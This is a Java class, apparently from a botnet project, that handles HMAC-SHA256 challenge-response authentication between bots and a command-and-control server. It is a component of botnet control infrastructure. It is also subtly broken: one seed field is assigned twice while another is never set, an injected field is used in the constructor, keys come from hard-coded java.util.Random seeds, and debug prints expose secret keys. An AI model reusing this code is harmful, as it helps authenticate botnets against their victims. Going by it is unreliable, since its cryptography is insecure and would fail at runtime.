package cs.sii.bot.active;

import java.util.HashMap;
import java.util.Random;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.codec.binary.Base64;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import cs.sii.config.bot.Engine;
import cs.sii.model.Conversions;

@Service
public class CryptoAuth {

	@Autowired
	private Engine eng;
	private static final String TYPE_MAC = "HmacSHA256";

	// TODO da decidere con stringa lunga
	// Non necessità di essere cambiata nel tempo
	private static final String seedNumberGenerator = "";

	// TODO da decidere con stringa lunga
	private String seedIterationGenerator1;
	private String seedIterationGenerator2;
	private String seedIterationGenerator3;

	private Random rndIt = new Random();
	private Random rndRnd = new Random();

	
	
	private HashMap<Long, Long> botSeed = new HashMap<>();

	public CryptoAuth() {
		
		seedIterationGenerator1 = "5ffffffffffffffd";
		seedIterationGenerator2 = "5fffffffffffffdd";
		seedIterationGenerator1 = "5ffffffffffffffe";

		
		if(eng.isCommandandconquerStatus()){
			rndIt.setSeed(Long.parseLong(seedIterationGenerator1, 16));
			rndRnd.setSeed(Long.parseLong(seedIterationGenerator2, 16));
			
		}
	
	}

	// TODO creare metodo per la generazione del Seed

	/**
	 * converte seed in Long
	 * 
	 * @return Long seed
	 */
	private Long convertSeed(String seed) {
		byte[] b = seed.getBytes();
		return Conversions.bytesToLong(b);
	}
	
	
	
	/**
	 * genera un numero per la creazione del secretKey
	 * 
	 * 
	 */
	public Long generateIterationNumber() {
		return rndIt.nextLong();
	}

	/**
	 * genera un messaggio randomico utilizzato per la fase di hmac
	 */
	public Long generateNumberText() {
		return rndRnd.nextLong();
	}

	/**
	 * @param iteration
	 * @return
	 */
	public String generateStringKey(Long iteration) {
		Random rnd = new Random();
		rnd.setSeed(Long.parseLong(seedIterationGenerator3, 16));
		while (iteration > 0) {
			rnd.nextLong();
			iteration--;
		}
		return Long.toString(rnd.nextLong());
	}

	/**
	 * genera la secret key da utilizzare per la funziona di Hmac
	 */
	public SecretKeySpec generateSecretKey(String stringKey) {
		return new SecretKeySpec(stringKey.getBytes(), TYPE_MAC);
	}

	/**
	 * valida un hmac generando localmente e verificando con i dati inviati
	 * 
	 * @param hashMac
	 * @return
	 */
	public boolean validateHmac(Long keyNumber, Long iterationNumber, String hashMac) {
		Random rnd = new Random();
		rnd.setSeed(Long.parseLong(seedIterationGenerator3, 16));
		System.out.println("hamca" + keyNumber + "   it  " + iterationNumber + " string hmac  " + hashMac);

		String stringKey = generateStringKey(iterationNumber);
		System.out.println("string "+stringKey);
		SecretKeySpec secretKey = generateSecretKey(stringKey);
		System.out.println("sck  "+secretKey);

		if (generateHmac(keyNumber, secretKey).equals(hashMac)) {
    		System.out.println("tr");

			return true;
			
		} else {
    		System.out.println("fl");

			return false;
		}
	}

	/**
	 * genera la stringa hash hmac
	 * 
	 * @param message
	 * @return
	 */
	public String generateHmac(Long message, SecretKeySpec secretKey) {
		String hash = "";
		try {
			Mac sha256_HMAC = Mac.getInstance(TYPE_MAC);
			sha256_HMAC.init(secretKey);
			hash = Base64.encodeBase64String(sha256_HMAC.doFinal(Conversions.longToBytes(message)));
    		System.out.println("hash rifatto "+hash);

		} catch (Exception e) {
			System.out.println("Error");
		}
		return hash;
	}

	public void addBotChallengeInfo(Long key, Long value) {
		botSeed.put(key, value);
	}

	public boolean findBotChallengeInfo(Long key, Long value) {
		if (botSeed.get(key) != null)
			return true;
		return false;
	}

}
